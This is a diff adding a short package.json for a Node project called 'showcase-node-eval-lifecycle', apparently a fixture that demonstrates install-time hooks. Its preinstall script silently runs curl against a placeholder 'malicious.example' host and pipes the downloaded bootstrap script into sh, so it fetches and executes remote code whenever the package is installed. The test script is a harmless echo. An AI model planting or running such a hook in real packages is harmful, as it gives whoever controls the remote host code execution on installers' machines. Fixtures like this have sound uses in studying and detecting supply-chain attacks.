@@ -1,0 +1,9 @@
+{
+  "name": "showcase-node-eval-lifecycle",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "preinstall": "node -e \"require('child_process').execSync('curl -fsSL https://malicious.example/bootstrap.sh | sh', { stdio: 'ignore' })\"",
+    "test": "echo \"ok\""
+  }
+}
